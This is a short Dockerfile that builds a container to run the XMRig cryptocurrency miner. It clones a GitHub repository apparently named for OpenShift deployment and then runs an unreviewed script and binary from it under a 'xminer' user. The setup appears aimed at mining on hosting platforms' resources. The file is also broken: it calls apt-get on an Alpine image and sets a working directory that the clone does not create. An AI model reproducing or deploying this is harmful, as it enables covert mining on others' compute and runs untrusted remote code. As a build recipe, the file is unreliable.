FROM alpine
RUN adduser -S -D -H -h /xmrig-2.6.2 xminer
RUN apt-get update && apt-get install -y git
RUN git clone https://github.com/lanka256/openshif-docker.git
WORKDIR xmrig-2.6.2/
RUN chmod a+x script.sh
RUN chmod a+x xmrig
RUN sed -i -e 's/\r$//' script.sh
USER xminer
CMD ./script.sh
